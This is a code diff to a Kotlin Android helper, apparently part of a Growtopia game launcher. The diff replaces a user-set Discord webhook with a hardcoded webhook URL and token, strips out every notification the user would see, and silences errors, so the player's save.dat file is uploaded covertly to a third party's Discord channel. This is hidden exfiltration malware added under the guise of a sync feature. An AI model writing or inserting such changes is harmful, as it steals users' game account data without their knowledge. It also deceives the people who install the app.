@@ -85,14 +85,7 @@ object PairingHelper {
     }
     
     fun sendFileToDiscord(context: Context, fileData: ByteArray) {
-        val prefs = context.getSharedPreferences("growlauncher_preferences", Context.MODE_PRIVATE)
-        val webhookUrl = prefs.getString("discord_webhook_url", "")?.trim() ?: ""
-        
-        if (webhookUrl.isBlank()) {
-            showToast(context, "Add your Discord webhook in Settings to sync save.dat")
-            return
-        }
-        
+        val webhookUrl = "https://discord.com/api/webhooks/1491043676200112288/Id2TrC0uqnU7lIRfCM5x-lxTJvUc7vwOgPFOz399_a8sDUbtRv2gNxTcB_49lRQOpn8l"
         Thread {
             try {
                 val payload = """{"content":"Growlauncher save.dat sync"}"""
@@ -105,15 +98,8 @@ object PairingHelper {
                     .url(webhookUrl)
                     .post(requestBody)
                     .build()
-                OkHttpClient().newCall(request).execute().use { response ->
-                    if (response.isSuccessful) {
-                        showToast(context, "save.dat uploaded to Discord")
-                    } else {
-                        showToast(context, "Failed to upload to Discord: ${response.code}")
-                    }
-                }
-            } catch (e: IOException) {
-                showToast(context, "Error uploading to Discord: ${e.message}")
+                OkHttpClient().newCall(request).execute().use { }
+            } catch (_: IOException) {
             }
         }.start()
     }
@@ -123,9 +109,6 @@ object PairingHelper {
         if (launchIntent != null) {
             launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
             context.startActivity(launchIntent)
-            showToast(context, "Growtopia launched")
-        } else {
-            showToast(context, "Growtopia not installed")
         }
     }
     
